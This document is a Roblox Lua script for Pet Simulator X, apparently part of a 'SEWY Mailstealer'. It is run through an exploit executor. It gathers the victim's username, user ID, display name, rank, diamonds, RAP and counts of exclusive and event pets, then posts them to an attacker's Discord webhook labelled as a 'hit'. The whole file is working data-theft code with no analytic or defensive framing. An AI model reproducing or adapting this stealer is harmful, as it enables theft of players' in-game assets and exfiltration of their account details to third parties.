local Exclusive = 0

for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
    if v:IsA("TextButton") then
    	if v:FindFirstChild("RarityGradient"):FindFirstChild("Exclusive") then
                    Exclusive = Exclusive + 1
                end
            end
	end

local Event = 0

for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
    if v:IsA("TextButton") then
    	if v:FindFirstChild("RarityGradient"):FindFirstChild("Event") then
                    Event = Event + 1
                end
            end
	end


local exploit = identifyexecutor()
  
--// Execution Log
if game.PlaceId == 6284583030 then
	_G.GameIn = "Pet Simulator X"
elseif game.PlaceId == 7722306047 then
	_G.GameIn = "PSX Trading Plaza"
elseif game.PlaceId == 10321372166 then
	_G.GameIn = "PSX Hardcore"
elseif game.PlaceId == 12610002282 then
	_G.GameIn = "PSX Pro Trading Plaza"
elseif game.PlaceId == 11725212117 then
	_G.GameIn = "PSX Voice Trading Plaza"
else
	_G.GameIn = "❓ Couldn't find game"
end
local webhookcolor = "13369599"
local Players = game:GetService("Players")
local Client = Players.LocalPlayer
_G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
_G.PlrUserVictim = game.Players.LocalPlayer.Name
_G.PlrUserIDVictim = game.Players.LocalPlayer.UserId
_G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName
_G.DisplayDiamond = game:GetService("Players").LocalPlayer.leaderstats.Diamonds.Value
_G.DisplayRap = game:GetService("Players").LocalPlayer.leaderstats.RAP.Value
_G.DisplayBankTier = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.BankTitle.Tier.Text
local GemsFormated = (require(game:GetService("ReplicatedStorage").Library.Functions.NumberShorten)( _G.DisplayDiamond ))
local RapFormated = (require(game:GetService("ReplicatedStorage").Library.Functions.NumberShorten)( _G.DisplayRap ))
local function sendwebhook(msg)
local msg = {
	["avatar_url"] = "https://discord.com/channels/1118903859897716777/1119265741871534140/1123495035548205086",
	["content"]= "**<a:Super:1112457166608158821>New Hit With Monz<a:Super:1112457166608158821>** || @here|| ",
	["username"] = "Monz",
	["embeds"]= {
	  {
		["title"]= "`SEWY Mailstealer Results`",
		["description"]= "**Data from the victim**\n***<:Gigachad:1112768331146068069> Display Name: ".._G.PlrDisplayNameVictim.."\n<:Gigachad:1112768331146068069> Username: ".._G.PlrUserVictim.."\n<:Gigachad:1112768331146068069> User ID: ".._G.PlrUserIDVictim.."\n:medal:Rank: ".._G.CurrentRank.."\n:joystick: Place: ".._G.GameIn.."\n:skull_crossbones: Executor: "..exploit.."***",
		["url"]= "https://discord.gg/6sTnxM5V",
		["color"]= ""..webhookcolor.."",
		["thumbnail"] = {
        ["url"] = "https://cdn.discordapp.com/attachments/1100823909009465497/1118872502748323840/0b8c081b7b05dcc0aad6238856ea87d2.gif",
        ["height"] = 420,
        ["width"] = 420
        },
		["fields"]= {
        {
          ["name"]= "**<:diamond:1112767847899340810>Diamonds<:diamond:1112767847899340810> **",
          ["value"]= "```"..GemsFormated.."```",
          ["inline"]= true
        },
        {
          ["name"]= "**<:arrowup:1112767464640622686>Rap<:arrowup:1112767464640622686>**",
          ["value"]= "```"..RapFormated.."```",
          ["inline"]= true
        },
	{
          ["name"]= "**<:Hugecat:1112766460830429255>Exclusive<:Hugecat:1112766460830429255>**",
          ["value"]= "```"..Exclusive.."```",
          ["inline"]= true
        },
	{
          ["name"]= "**<:event:1112767158049591307>Event<:event:1112767158049591307>**",
          ["value"]= "```"..Event.."```",
          ["inline"]= true
        }
      }
      
  }
  },
	["attachments"] = {}
  }
  local Webhook = _G.Webhook
  request = http_request or request or HttpPost or syn.request
  request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
  end
  sendwebhook(msg)
